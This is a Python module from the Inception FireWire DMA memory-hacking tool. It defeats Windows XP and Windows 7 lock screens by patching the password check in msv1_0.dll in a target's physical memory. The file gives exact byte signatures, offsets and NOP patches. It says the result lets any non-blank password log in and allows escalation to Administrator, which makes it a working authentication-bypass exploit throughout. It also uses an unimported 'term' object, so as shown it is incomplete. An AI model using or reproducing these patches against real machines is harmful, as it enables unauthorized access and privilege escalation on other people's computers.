'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg, sound, util
from inception.memory import Target, Signature, Chunk
import os
import sys
import time

info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
'this module you should be able to log in with any non-blank password.'

# Target template for copying
# Target(
#     name=None,
#     note=None,
#     signatures=[
#         Signature(
#             os=None,
#             os_versions=[],
#             os_architectures=['x86', 'x64'],
#             executable=None,
#             version=None,
#             md5=None,
#             tag=False,
#             offsets=[],
#             chunks=[
#                 Chunk(
#                     chunk=None,
#                     chunkoffset=0x00,
#                     patch=None,
#                     patchoffset=0x00)
#                 ]
#             )
#         ]
#     )


targets = [
Target(
    name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
    note='NOPs out the jump that is called if passwords doesn\'t match. This '
    'will cause all accounts to no longer require a password, and will also '
    'allow you to escalate privileges to Administrator via the \'runas\' '
    'command. Note: As the patch stores the LANMAN/NTLM hash of the entered '
    'password, the account will be locked out of any Windows AD domain '
    'he/she was member of at this machine.',
    signatures=[
        Signature(
            os=None,
            os_versions=['SP0', 'SP1'],
            os_architectures=['x64'],
            executable='msv1_0.dll',
            version=None,
            md5=None,
            tag=False,
            offsets=[0x2a8, 0x2a1, 0x291, 0x321],
            chunks=[
                Chunk(
                    chunk=0xc60f85,
                    chunkoffset=0x00,
                    patch=0x909090909090,
                    patchoffset=0x01),
                Chunk(
                    chunk=0xb8,
                    chunkoffset=0x07,
                    patch=None,
                    patchoffset=0x00)
                ]
            ),
        Signature(
            os=None,
            os_versions=['SP0'],
            os_architectures=['x86'],
            executable='msv1_0.dll',
            version=None,
            md5=None,
            tag=False,
            offsets=[0x926],
            chunks=[
                Chunk(
                    chunk=0x83f8107513b0018b,
                    chunkoffset=0x00,
                    patch=0x83f8109090b0018b,
                    patchoffset=0x00)
                ]
            ),
        Signature(
            os=None,
            os_versions=['SP1'],
            os_architectures=['x86'],
            executable='msv1_0.dll',
            version=None,
            md5=None,
            tag=False,
            offsets=[0x312],
            chunks=[
                Chunk(
                    chunk=0x83f8100f8550940000b0018b,
                    chunkoffset=0x00,
                    patch=0x83f810909090909090b0018b,
                    patchoffset=0x00)
                ]
            )
        ]
    ),
Target(
    name='Windows XP MsvpPasswordValidate unlock/privilege escalation',
    note='NOPs out the jump that is called if passwords doesn\'t match. '
    'This will cause all accounts to no longer require a password, and '
    'will also allow you to escalate privileges to Administrator via the '
    '\'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of '
    'the entered password, the account will be locked out of any Windows '
    'AD domain he/she was member of at this machine.',
    signatures=[
        Signature(
            offsets=[0x862, 0x8aa, 0x946, 0x126, 0x9b6],
            os='Windows XP',
            os_versions=['SP2', 'SP3'],
            os_architectures=['x86'],
            executable='msv1_0.dll',
            version=None,
            md5=None,
            tag=False,
            chunks=[
                Chunk(
                    chunk=0x83f8107511b0018b,
                    chunkoffset=0x00,
                    patch=0x83f8109090b0018b,
                    patchoffset=0x00)
                ]
            )
        ]
    )
]


def add_options(parser):
    parser.add_option('-l', action='store_true', dest='list_targets',
        help='list available targets.')
    parser.add_option('-r', '--revert', action='store_true', 
        dest='revert', help='revert patch after use.')


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        term.info('Only one target present, auto-selected')
        return targets[0]
    if not selected:
        selected = term.poll('Please select target (or enter \'q\' to quit):')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            term.warn('Invalid selection, please try again. Type \'q\' to quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
                  '. Type \'q\' to quit')
        return select_target(targets)

    
def list_targets(details=False):
    term.info('Available targets (known signatures):')
    term.separator()
    for number, target in enumerate(targets, 1):
        term.info('{0}'.format(target.name), sign=number)
    if details:
        term.write(target)
    term.separator()


def run(opts, memspace):
    '''
    Main attack logic
    '''
    list_targets(details=opts.verbose)
    # List targets only?
    if opts.list_targets:
        sys.exit(0)
       
    # Select target, print selection
    target = select_target(targets)
    term.info('Selected target: ' + target.name)
    
    address, signature, offset, chunks = memspace.find(target).pop()
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
    if not opts.dry_run:
        success, backup = memspace.patch(address, chunks)
        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')

        if opts.revert:
            term.poll('Press [enter] to revert the patch:')
            memspace.write(address, backup)

            if backup == memspace.read(address, cfg.PAGESIZE):
                term.info('Revert patch verified; successful')
            else:
                term.warn('Revert patch could not be verified')
    
    return address, page


